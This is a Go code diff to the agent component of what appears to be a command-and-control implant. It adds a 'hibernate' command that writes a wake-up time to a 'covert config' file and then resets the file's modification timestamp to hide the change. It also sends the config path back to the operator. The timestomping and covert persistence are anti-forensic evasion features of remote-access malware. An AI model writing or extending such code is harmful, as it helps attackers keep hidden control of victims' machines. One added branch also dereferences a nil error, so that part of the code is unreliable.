@@ -20,6 +20,7 @@ package agent
 import (
 	// Standard
 	"fmt"
+	"io/ioutil"
 	"os"
 	"strconv"
 	"strings"
@@ -72,13 +73,62 @@ func (a *Agent) control(job jobs.Job) {
 			results.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMax that was not greater than zero:\r\n%s", strconv.FormatInt(tmax, 10))
 			break
 		}
+	case "hibernate":
+		amount, err := strconv.ParseInt(cmd.Args[0], 10, 64)
+		if err != nil {
+			results.Stderr = fmt.Sprintf("There was an error hibernating:\r\n%s", err.Error())
+			break
+		}
+
+		if amount > 0 {
+			cli.Message(cli.NOTE, fmt.Sprintf("Hibernating for %s seconds", cmd.Args[0]))
+			a.WaitTimeMin = amount
+			a.WaitTimeMax = amount
+			a.InactiveCount = -2
+			//Calculate hibernation date/time and write it to the covert config
+			currentdatetime := time.Now()
+			hibernateuntiltime := currentdatetime.Add(time.Second * time.Duration(amount))
+			hibernateuntiltimeunixepoc := hibernateuntiltime.Unix()
+
+			// Get the file's touch time
+			origcovertconfigtimefile, err2 := os.Stat(a.CovertConfig)
+			var origcovertconfigtime time.Time
+			if err2 != nil {
+				cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err2.Error()))
+				origcovertconfigtime = time.Unix(0, 0)
+			} else {
+				origcovertconfigtime = origcovertconfigtimefile.ModTime()
+			}
+
+			err3 := ioutil.WriteFile(a.CovertConfig, []byte(strconv.FormatInt(hibernateuntiltimeunixepoc, 10)), 0755)
+			if err3 == nil {
+				// Touch it back
+				if origcovertconfigtime != time.Unix(0, 0) {
+					err4 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
+					if err4 != nil {
+						results.Stderr = fmt.Sprintf("Failed to touch covert config:\r\n%s", err4.Error())
+					}
+				}
+			} else {
+				results.Stderr = fmt.Sprintf("Error writing to the covert config:\r\n%s", err3.Error())
+			}
+		} else {
+			results.Stderr = fmt.Sprintf("Must supply positive number of seconds to hibernate:\r\n%s", cmd.Args[0])
+			break
+		}
 	case "inactivemultiplier":
 		t, err := strconv.ParseInt(cmd.Args[0], 10, 64)
 		if err != nil {
 			results.Stderr = fmt.Sprintf("There was an error changing the agent inactive multiplier:\r\n%s", err.Error())
 			break
 		}
-		a.InactiveMultiplier = t
+		if t != 0 {
+			a.InactiveMultiplier = t
+		} else {
+			results.Stderr = fmt.Sprintf("Cannot specify 0 for the agent inactive multiplier. If attempting to disable, use 1 instead:\r\n%s", err.Error())
+			break
+		}
+
 	case "inactivethreshold":
 		t, err := strconv.Atoi(cmd.Args[0])
 		if err != nil {
@@ -185,6 +235,7 @@ func (a *Agent) getAgentInfoMessage() messages.AgentInfo {
 		SysInfo:            sysInfoMessage,
 		KillDate:           a.KillDate,
 		JA3:                a.Client.Get("ja3"),
+		CovertConfig:       a.CovertConfig,
 	}
 	cli.Message(cli.DEBUG, fmt.Sprintf("Returning AgentInfo message:\r\n%+v", agentInfoMessage))
 	return agentInfoMessage
